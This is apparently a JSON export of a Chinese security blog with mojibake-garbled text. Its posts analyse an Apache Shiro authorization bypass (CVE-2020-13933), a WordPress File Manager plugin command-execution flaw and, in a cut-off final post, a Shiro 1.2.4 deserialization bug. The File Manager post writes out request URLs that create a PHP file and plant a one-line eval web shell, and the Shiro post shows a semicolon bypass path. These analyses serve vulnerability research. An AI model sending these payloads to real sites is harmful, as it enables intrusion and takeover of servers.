{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"friendship","date":"2020-08-29T16:34:40.000Z","updated":"2020-08-31T02:36:41.020Z","comments":true,"path":"friendship/index.html","permalink":"http://yoursite.com/friendship/index.html","excerpt":"","text":"å¼ ä¸‰æŽå››æ˜¯å¤§ä½¬ï¼ŒæŽå››æ˜¯å¤§ä½¬ï¼ŒæŽå››æ˜¯å¤§ä½¬ï¼ŒæŽå››æ˜¯å¤§ä½¬ï¼ŒæŽå››æ˜¯å¤§ä½¬æŽå››æˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬ï¼Œæˆ‘ä¸æ˜¯å¤§ä½¬çŽ‹äº”æˆ‘æ˜¯å°ç™½ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"Apache Shiro æƒé™ç»•è¿‡æ¼æ´ž(CVE-2020-13933)","slug":"Apache Shiro æƒé™ç»•è¿‡æ¼æ´ž(CVE-2020-13933)","date":"2020-09-23T02:27:47.000Z","updated":"2020-09-25T09:27:01.330Z","comments":true,"path":"2020/09/23/Apache Shiro æƒé™ç»•è¿‡æ¼æ´ž(CVE-2020-13933)/","link":"","permalink":"http://yoursite.com/2020/09/23/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-13933)/","excerpt":"å‰è¨€ ä¹‹å‰åˆ†æžäº† Apache Shiro æƒé™ç»•è¿‡æ¼æ´ž(CVE-2020-11989)ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´åˆå‡ºçŽ°äº†æ–°çš„æƒé™ç»•è¿‡æ¼æ´ž (CVE-2020-13933)ã€‚åº”è¯¥æ˜¯åœ¨ä¿®å¤çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ç»•è¿‡ã€‚ CVE-2020-11989 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.5.3 , CVE-2020-13933 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.6.0 ã€‚","text":"å‰è¨€ ä¹‹å‰åˆ†æžäº† Apache Shiro æƒé™ç»•è¿‡æ¼æ´ž(CVE-2020-11989)ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´åˆå‡ºçŽ°äº†æ–°çš„æƒé™ç»•è¿‡æ¼æ´ž (CVE-2020-13933)ã€‚åº”è¯¥æ˜¯åœ¨ä¿®å¤çš„åŸºç¡€ä¸Šè¿›è¡Œäº†ç»•è¿‡ã€‚ CVE-2020-11989 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.5.3 , CVE-2020-13933 çš„å½±å“ç‰ˆæœ¬ä¸º Apache Shiro &lt; 1.6.0 ã€‚ åœ¨è¿™ä¸ªåœ°æ–¹ Shiro å¯¹ url çš„å¤„ç†æ˜¯é€ æˆ CVE-2020-11989 çš„åŽŸå› ä¹‹ä¸€ï¼ŒApache Shiro 1.5.3 å¯¹æ­¤è¿›è¡Œçš„ä¿®å¤ã€‚ ç„¶åŽæˆ‘ä»¬æŸ¥çœ‹æœ€æ–°ç‰ˆçš„ Apache Shiro 1.6.0 å‘çŽ°åœ¨ web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java å¢žåŠ äº†ä»Žå…¨å±€ä¸Šå¯¹åˆ†å·ï¼Œåæ–œæ å’ŒéžASCIIå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ çŽ¯å¢ƒæ­å»º è¿˜æ˜¯é€‰æ‹© https://github.com/l3yx/springboot-shiro é¡¹ç›®è¿›è¡Œæµ‹è¯•ä¸‹è½½å®ŒæˆåŽä¿®æ”¹ä¸€ä¸‹ pom.xml ä¸­ org.apache.shiro æ‰€å¯¹åº”çš„ç‰ˆæœ¬å· ä¸º 1.5.3 ï¼ŒåŒæ—¶å°† LoginController ä¸­ä¿®æ”¹ä¸º 1234@GetMapping(\"/admin/{name}\") public String admin(@PathVariable String name) { return \"admin page,hello \" + name; } åŽŸå› ä¹‹åŽæè¿°ï¼ŒåŒæ—¶ä¸ºäº†æ–¹ä¾¿è°ƒè¯•ï¼ŒåŒæ—¶åœ¨ pom.xml æ–‡ä»¶ä¸­åŠ å…¥ 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt; &lt;artifactId&gt;shiro-core&lt;/artifactId&gt; &lt;version&gt;1.5.3&lt;/version&gt;&lt;/dependency&gt; ç”Ÿæˆ war åŒ…ï¼Œéƒ¨ç½²äºŽTomcat ä¿®æ”¹ \\apache-tomcat-8.0.52\\bin\\catalina.bat æ–‡ä»¶ 123if not \"%JPDA_ADDRESS%\" == \"\" goto gotJpdaAddressset JPDA_ADDRESS=127.0.0.1:5005:gotJpdaAddress catalina.bat jpda start å¯åŠ¨ ï¼Œé…ç½® idea ä¸­çš„è¿œç¨‹è°ƒè¯• æ¼æ´žåˆ†æž Shiro å±‚ Tomcat ç±»ä¸­çš„ org.apache.catalina.core.ApplicationFilterChain æ˜¯ç”¨äºŽç®¡ç†é’ˆå¯¹è¯·æ±‚ request çš„è¿‡æ»¤å™¨ã€‚ Tomcat çš„ç±» ApplicationFilterChain æ˜¯ä¸€ä¸ª Java Servlet APIè§„èŒƒ javax.servlet.FilterChain çš„å®žçŽ°ï¼Œç”¨äºŽç®¡ç†æŸä¸ªè¯·æ±‚ request çš„ä¸€ç»„è¿‡æ»¤å™¨ Filter çš„æ‰§è¡Œã€‚å½“é’ˆå¯¹ä¸€ä¸ª reques æ‰€å®šä¹‰çš„ä¸€ç»„è¿‡æ»¤å™¨ Filter å¤„ç†å®Œè¯¥è¯·æ±‚åŽï¼Œç»„åŽä¸€ä¸ª doFilter() è°ƒç”¨æ‰ä¼šæ‰§è¡Œç›®æ ‡ Servlet çš„æ–¹æ³• service(),ç„¶åŽå“åº”å¯¹è±¡ response ä¼šæŒ‰ç…§ç›¸åçš„é¡ºåºä¾æ¬¡è¢«è¿™äº›Filterå¤„ç†ï¼Œæœ€ç»ˆåˆ°è¾¾å®¢æˆ·ç«¯ã€‚ æ ¹æ®è°ƒè¯•æ—¶æ˜¾ç¤ºå‡ºçš„è°ƒç”¨é“¾ï¼Œå¯ä»¥çœ‹åˆ°å…ˆæ‰§è¡Œåˆ°äº† shiro ä¸­çš„ OncePerRequestFilter è¿™ä¸ªç±» åœ¨ shiro ä¸­ org.springframework.web.filter.OncePerRequestFilter è¿™ä¸ªç±»æ˜¯å…¶ä»–çš„æ‰€æœ‰ filter çš„çˆ¶ç±»ï¼Œæ‰€æœ‰çš„ filter çš„ doFilter æ–¹æ³•éƒ½æ˜¯è°ƒç”¨çš„è¿™ä¸ªç±»ä¸­çš„ doFIlter æ–¹æ³•ã€‚ é¦–å…ˆè°ƒç”¨ getAlreadyFilteredAttributeName() ä¸ºè¿‡æ»¤å™¨æ ‡è®°ï¼Œç„¶åŽåˆ¤æ–­è¿‡æ»¤å™¨æ˜¯å¦å·²ç»è°ƒç”¨è¿‡ï¼Œæ˜¯å¦æœªä¸ºå½“å‰è¯·æ±‚å¯ç”¨ã€‚org.apache.shiro.web.servlet.OncePerRequestFilter#doFilter ç„¶åŽè°ƒç”¨ doFilterInternal æ–¹æ³•ï¼Œè·Ÿè¿›åŽå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„æ˜¯ public abstract class AbstractShiroFilter extends OncePerRequestFilter ä¸­çš„ doFilterInternal æ–¹æ³•org.apache.shiro.web.servlet.AbstractShiroFilter#doFilterInternal è·Ÿè¿›å‡½æ•° executeChainorg.apache.shiro.web.servlet.AbstractShiroFilter#executeChain è·Ÿè¿›å‡½æ•° getExecutionChainorg.apache.shiro.web.servlet.AbstractShiroFilter#getExecutionChain è·Ÿè¿›å…¶ä¸­çš„ getChainorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain è·Ÿè¿›æ–¹æ³• getPathWithinApplicationorg.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getPathWithinApplication WebUtils#getPathWithinApplication ä¿®å¤äº†ä¹‹å‰ shiro 1.5.2 æ‰€å­˜åœ¨çš„ url åŒç¼–ç ç»•è¿‡é—®é¢˜ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æœ€åŽçš„è¿”å›žå€¼æ˜¯ /admin/ org.apache.shiro.web.util.WebUtils#getPathWithinApplication org.apache.shiro.web.util.WebUtils#getServletPath è¿”å›žå€¼ä¸º /admin/;whippet org.apache.shiro.web.util.WebUtils#getPathInfo è¿”å›ž \"\" org.apache.shiro.web.util.WebUtils#removeSemicolon å°† ; åŠå…¶ä¹‹åŽçš„å…¨éƒ¨åˆ é™¤ å›žåˆ°å‡½æ•° org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain ç»§ç»­å‘ä¸‹æ‰§è¡Œå¦‚æžœè¯·æ±‚çš„ä¸æ˜¯ /ï¼Œå°±åŽ»é™¤æœ«å°¾çš„ / ï¼Œè¿”å›žå€¼å°±æ˜¯ /admin private static final String DEFAULT_PATH_SEPARATOR = \"/\"; æŽ¥ç€æ ¹æ® filterChainManager.getChainNames() èŽ·å–çš„æ‹¦æˆªå™¨è¿›è¡ŒåŒ¹é… org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches org.apache.shiro.util.AntPathMatcher#matchesorg.apache.shiro.util.AntPathMatcher#matchorg.apache.shiro.util.AntPathMatcher#doMatchpattDirs çš„æœ€åŽä¸€ä½æ˜¯ * æ‰€ä»¥ä¼šè¿”å›ž false æ²¡æœ‰åŒ¹é…åˆ°ä¼šè¿”å›ž null åŒ¹é…åˆ°çš„è¯ä¼šæŒ‡å‘ ProxiedFilterChain 1.è·¯å¾„åŒ¹é…ï¼špathMatches(pathPattern, requestURI)ï¼Œé»˜è®¤çš„Fliteré€ä¸ªä¸Žè¯·æ±‚URIè¿›è¡ŒåŒ¹é…ï¼›2ã€ä»£ç†FilterChainï¼šProxiedFilterChainã€‚å¦‚æžœåŒ¹é…ä¸ä¸Šï¼Œé‚£ä¹ˆç›´æŽ¥èµ°servletçš„FilterChainï¼Œå¦åˆ™å…ˆèµ°shiroçš„ä»£ç†FilterChainï¼ˆProxiedFilterChainï¼‰ï¼Œä¹‹åŽå†èµ°servletçš„FilterChain ç»§ç»­å•æ­¥æ‰§è¡Œæœ€åŽè¿”å›ž ApplicationFilterChain ç›¸å½“äºŽå¹¶æ²¡æœ‰æ‰§è¡Œ Filter æ­¤æ—¶å°±ç›¸å½“äºŽå·²ç»ç»•è¿‡äº† shiro çš„æƒé™éªŒè¯ï¼Œå¯ä»¥ç›´æŽ¥è®¿é—®åˆ°éœ€è¦æƒé™ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æœ‰æ—¶ä¼šè¿”å›žè¿™æ ·çš„ç•Œé¢ï¼Œæ˜¯å› ä¸º Spring å¹¶æ²¡æœ‰åŒ¹é…åˆ°ç›¸å¯¹åº”çš„é¡µé¢ã€‚ Springå±‚ chain.doFilter(request, response); æŽ¥ä¸‹æ¥çš„è°ƒç”¨æ ˆå¦‚å›¾ Spring åœ¨ Tomcat ä¸­è¿è¡Œæ—¶éœ€è¦æä¾›å¯¹ Servlet è§„èŒƒçš„æ”¯æŒï¼Œå› ä¸º Tomcat æ—¶åŸºäºŽ Servlert è§„èŒƒçš„ web å®¹å™¨ã€‚ DispatcherServlet æ˜¯ Servlet è§„èŒƒçš„å…·ä½“å®žçŽ°ã€‚åœ¨ web å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¯åŠ¨ Tomcat å®¹å™¨æ—¶ä¼šæ ¹æ®å…¶ Servlet è§„èŒƒå¯åŠ¨ Spring å®žçŽ°çš„ DispatcherServlet ï¼Œè¿™æ ·å°±é©±åŠ¨äº† Spring çš„è¿è¡Œã€‚ DispatcherServlet åœ¨å°†è¯·æ±‚æ˜ å°„åˆ°å¤„ç†å™¨æ—¶ï¼Œè°ƒç”¨äº† getHandlerorg.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler è·Ÿè¿› getHandlerInternalorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal é€šè¿‡ getLookupPathForRequest èŽ·å–è¯·æ±‚çš„ç»å¯¹è·¯å¾„org.springframework.web.util.UrlPathHelper#getLookupPathForRequest(javax.servlet.http.HttpServletRequest) org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping è·Ÿè¿›å‡½æ•° getPathWithinApplicationorg.springframework.web.util.UrlPathHelper#getPathWithinApplication è·Ÿè¿›å‡½æ•° getRequestUriorg.springframework.web.util.UrlPathHelper#getRequestUri decodeAndCleanUriString å¯¹ url è¿›è¡Œäº†è§£ç å¤„ç†org.springframework.web.util.UrlPathHelper#decodeAndCleanUriStringæ­¤å¤„å­˜åœ¨ä¸€ä¸ªé—®é¢˜,å› ä¸ºåˆ©ç”¨ ; å°±å¯ä»¥ç›´æŽ¥ç»•è¿‡ shiro çš„æƒé™éªŒè¯ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆåœ¨ç›´æŽ¥ä½¿ç”¨ ; æ—¶ä¼šè¿”å›ž 404 é”™è¯¯ï¼Œåœ¨ spring ä¸­ä¸èƒ½æ‰¾åˆ°è¯¥é¡µé¢org.springframework.web.util.UrlPathHelper#decodeAndCleanUriStringdecodeAndCleanUriString ä¼šå…ˆå°† url ä¸­ ; åŽé¢çš„æ•°æ®è¿›è¡Œåˆ†å‰²ç„¶åŽå†è¿›è¡Œ url è§£ç è§£å†³äº†è¿™ä¸ªå°å°çš„é—®é¢˜ï¼Œåˆäº§ç”Ÿäº†ä¸€ä¸ªå¤§å¤§çš„ç–‘é—®ï¼Œåœ¨ Apache Shiroæƒé™ç»•è¿‡æ¼æ´žåˆ†æž(CVE-2020-11989) ä¸€æ–‡ä¸­å¸ˆå‚…æ‰€åˆ©ç”¨çš„ POC ä¸º /;/test/admin/page å¦‚æžœæ˜¯è¿™æ ·çš„è¯ï¼Œä»Ž ; è¿›è¡Œåˆ†å‰²ï¼Œæœ€åŽå¾—å‡ºæ¥çš„åº”è¯¥æ˜¯ä¸€ç›´åŽ»è¯·æ±‚ / é¡µé¢ï¼Œä¸åº”è¿”å›žæƒé™ä¸‹çš„é¡µé¢ï¼Œè¿™ä¸ªé—®é¢˜æš‚ä¸”æ”¾ä¸‹ï¼Œç»§ç»­å‘ä¸‹åˆ†æžã€‚ ç„¶åŽå›žåˆ°å‡½æ•° org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal è·Ÿè¿› lookupHandlerMethodorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod è·Ÿè¿›å…¶ä¸­çš„ addMatchingMappingsorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#addMatchingMappings org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingCondition org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ° /admin/{name} ä¸Ž /admin/;whippet èƒ½å¤ŸåŒ¹é…æˆåŠŸã€‚ ä¼šè¿”å›ž/admin/;whippet çš„é¡µé¢ï¼Œæ­¤æ—¶çš„ name å€¼ä¸º ;wippet ï¼Œå¦‚æžœä¹‹å‰æˆ‘ä»¬å¹¶æ²¡æœ‰ä¿®æ”¹ä»£ç ï¼Œè€Œæ˜¯å›ºå®šçš„é¡µé¢çš„è¯ è®¿é—® /admin/page è‡ªç„¶æ˜¯ä¸Ž admin/;page åŒ¹é…ä¸ä¸Šçš„ã€‚ å‚è€ƒæ–‡ç«  CVE-2020-13933: Apache Shiro æƒé™ç»•è¿‡æ¼æ´žåˆ†æžshiroæºç ç¯‡ - shiroçš„filterï¼Œä½ å€¼å¾—æ‹¥æœ‰ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ","slug":"Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ","date":"2020-09-10T02:50:32.000Z","updated":"2020-09-25T09:27:01.332Z","comments":true,"path":"2020/09/10/Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ/","link":"","permalink":"http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"ps: é¦–å‘åœ¨äº‘ä¼—å¯ä¿¡çš„sec-inå¹³å°ï¼šsec-in.com çŽ¯å¢ƒæ­å»º åˆ©ç”¨ phpstudy æ­å»º wordpress ï¼Œhttp://wordpress.test/wp-admin/plugin-install.php å°†è§£åŽ‹ä¸€æ¬¡åŽçš„æ¼æ´žæ’ä»¶åŽ‹ç¼©åŒ…ä¸Šä¼ å¹¶å¯ç”¨æ’ä»¶ã€‚ File Manageræ’ä»¶6.0ç‰ˆæœ¬","text":"ps: é¦–å‘åœ¨äº‘ä¼—å¯ä¿¡çš„sec-inå¹³å°ï¼šsec-in.com çŽ¯å¢ƒæ­å»º åˆ©ç”¨ phpstudy æ­å»º wordpress ï¼Œhttp://wordpress.test/wp-admin/plugin-install.php å°†è§£åŽ‹ä¸€æ¬¡åŽçš„æ¼æ´žæ’ä»¶åŽ‹ç¼©åŒ…ä¸Šä¼ å¹¶å¯ç”¨æ’ä»¶ã€‚ File Manageræ’ä»¶6.0ç‰ˆæœ¬ æ¼æ´žåˆ©ç”¨ è¿™æ®µä»£ç æ¥è‡ª elFinder é¡¹ç›®ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘ Web åº”ç”¨ç¨‹åºæä¾›æ–‡ä»¶æµè§ˆå™¨ GUI çš„æ¡†æž¶ã€‚è¿™ä¸ªéžå¸¸å…·ä½“çš„ä»£ç ä»…ä½œä¸ºç¤ºä¾‹ï¼Œè€Œä¸èƒ½åœ¨ç”Ÿäº§åº”ç”¨ç¨‹åºä¸­ç›´æŽ¥ä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œä½¿ç”¨äº†å®ƒï¼Œç»“æžœæ˜¯å¯ä»¥æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç è€Œæ— éœ€è¿›è¡Œèº«ä»½éªŒè¯ã€‚ åœ¨ exp-db æœç´¢ elFinder ä¸‹è½½ä¸‹æ¥çš„æ¼æ´žåˆ©ç”¨æ–‡ä»¶éœ€è¦ä¿®æ”¹éƒ¨åˆ† æ¼æ´žåˆ†æž å‘é€ä¸€ä¸ªè¿™æ ·çš„ payload æ¥è¿›è¡Œåˆ›å»ºæ–‡ä»¶çš„æ“ä½œ http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw æ¼æ´žè§¦å‘ä½ç½® /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php é€šè¿‡åˆ›å»º elFinderConnector å¯¹è±¡ï¼Œè¿›è€Œè°ƒç”¨ elFinderConnector.run è¯»å–æ‰€æœ‰çš„è¯·æ±‚å‚æ•°ä¿å­˜åˆ° $src ä¸­ï¼Œ $cmd èŽ·å– cmd å˜é‡ã€‚\\elFinderConnector::run æŽ¥ç€æ‰§è¡Œåˆ°å¾ªçŽ¯ foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) { å¯¹ $cmd è¿›è¡Œæ ¡éªŒ è·Ÿè¿›å‡½æ•°commandArgsList\\elFinder::commandArgsList \\elFinder::commandExists é€šè¿‡åˆ¤æ–­ $cmd ï¼Œåœ¨ $this-&gt;commands[$cmd] ä¸­å‘çŽ°äº†å¯ä»¥è°ƒç”¨çš„æ–¹æ³•\\elFinder::$commands ç»§ç»­æ‰§è¡Œï¼Œå‘çŽ° $this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args)); \\elFinder::exec æŽ§åˆ¶ $cmd = makedile æ—¶, ä¸ºæ»¡è¶³æ¡ä»¶ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œéœ€è¦ä¼ å…¥ $target æˆ–è€… $dstã€‚ $this-&gt;volume($dst) æ ¹æ®ä¼ å…¥çš„ $dst å‰ç¼€è¿›è¡Œé€‰æ‹© l1_ æˆ–è€… t1_ æˆ‘ä»¬åœ¨åŽé¢è¿›è¡Œè°ƒè¯•æ—¶ä¼šå‘çŽ°ç”Ÿæˆæ–‡ä»¶çš„ä½ç½®å‰ç¼€ä¸ºæ‰€å¯¹åº”çš„ root çš„å€¼ ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹© l1_\\elFinder::volume ç»§ç»­æ‰§è¡Œåˆ°åŠ¨æ€è°ƒç”¨ï¼Œé€šè¿‡ $result = $this-&gt;$cmd($args); è°ƒç”¨makefileæ–¹æ³•ã€‚\\elFinderVolumeDriver::mkfile $path = $this-&gt;decode($dst); \\elFinderVolumeDriver::decodedecode å‡½æ•° å…ˆå°†$hash çš„å€¼æ ¹æ® $this-&gt;id è¿›è¡Œåˆ†å‰²ï¼Œç„¶åŽæ›¿æ¢å­—ä¸²å¹¶è¿›è¡Œ base64 è§£ç  ç„¶åŽæ‹¼æŽ¥ æ‰€å¯¹åº”çš„ $this-&gt;root è¿”å›ž$path = E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\filesç»§ç»­å›žåˆ° mkfile å‡½æ•°ä¸­æ‰§è¡Œ \\elFinderVolumeLocalFileSystem::_mkfile æœ€åŽé¡ºåˆ©ç”Ÿæˆæ–‡ä»¶åœ¨ E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.phpå¯¹äºŽç½‘ç«™çš„ä½ç½®å°±æ˜¯ \\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php ç„¶åŽå†è°ƒç”¨ PUT æ–¹æ³•ï¼Œä¼ å€¼åˆ° mkfile ç”Ÿæˆçš„æ–‡ä»¶å†…ã€‚ http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=put&amp;target=l1_dGVzdC5waHA=&amp;content=&lt;?php eval($_GET['cmd']);?&gt; å‰ä¸€éƒ¨åˆ†ä¸åœ¨è¯¦è¿°ï¼Œç›´æŽ¥è·Ÿåˆ° $result = $this-&gt;$cmd($args); è°ƒç”¨ put æ–¹æ³• \\elFinder::put \\elFinderVolumeDriver::putContents \\elFinderVolumeDriver::decodedecode å‡½æ•° å…ˆå°†$hash çš„å€¼æ ¹æ® $this-&gt;id è¿›è¡Œåˆ†å‰²ï¼Œç„¶åŽæ›¿æ¢å­—ä¸²å¹¶è¿›è¡Œ base64 è§£ç  ç„¶åŽæ‹¼æŽ¥ æ‰€å¯¹åº”çš„ $this-&gt;root æœ€åŽä¼šè¿”å›ž $path çš„å€¼ä¸ºE:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php\\elFinderVolumeLocalFileSystem::_filePutContents æˆåŠŸå°†å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ æˆåŠŸåˆ©ç”¨è¿˜å¯ä»¥ç›´æŽ¥åˆ©ç”¨ upload æ–¹æ³•ï¼Œä¸Šä¼ æ–‡ä»¶ \\elFinder::upload å‚è€ƒæ–‡ç«  Wordpress file manageræ’ä»¶ä»»æ„æ–‡ä»¶ä¸Šä¼ WordPressæ–‡ä»¶ç®¡ç†å™¨æ’ä»¶0dayæ¼æ´žè§£æž document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ž","slug":"Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ž","date":"2020-08-31T06:37:52.000Z","updated":"2020-09-25T09:27:01.330Z","comments":true,"path":"2020/08/31/Apache Shiro 1.2.4ååºåˆ—åŒ–æ¼æ´ž/","link":"","permalink":"http://yoursite.com/2020/08/31/Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"æ¼æ´žç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æž¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æŽˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æž¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åŽå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´žï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚","text":"æ¼æ´žç®€ä»‹ Apache Shiro æ˜¯ä¸€æ¬¾å¼€æºå®‰å…¨æ¡†æž¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æŽˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æž¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚Apache Shiro 1.2.4åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼ŒåŠ å¯†çš„ç”¨æˆ·ä¿¡æ¯åºåˆ—åŒ–åŽå­˜å‚¨åœ¨åä¸º RememberMe çš„ Cookie ä¸­ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ Shiro çš„é»˜è®¤å¯†é’¥ä¼ªé€ ç”¨æˆ· Cookieï¼Œè§¦å‘Javaååºåˆ—åŒ–æ¼æ´žï¼Œè¿›è€Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ SHIRO-550åœ¨è¯†åˆ«èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹ Cookie é‡Œçš„ RememberMe å­—æ®µè§£å¯†,è§£å¯†çš„é¡ºåºä¸ºï¼š æ£€ç´¢cookieä¸­RememberMeçš„å€¼ Base64è§£ç  ä½¿ç”¨AESè§£å¯† ååºåˆ—åŒ– ä½†æ˜¯ï¼ŒAES åŠ å¯†çš„ç§˜é’¥è¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼Œæ¯ä¸ªäººé€šè¿‡æºä»£ç éƒ½å¯ä»¥æ‹¿åˆ° AES åŠ å¯†çš„å¯†é’¥ã€‚æ‰€ä»¥å½“æ”»å‡»è€…å°†æ¶æ„çš„ payload è¿›è¡Œåºåˆ—åŒ–ã€AES åŠ å¯†ã€base64 ç¼–ç ï¼Œä½œä¸º Cookie çš„ RememberMe å­—æ®µå‘é€ã€‚Shiro å°† RememberMe 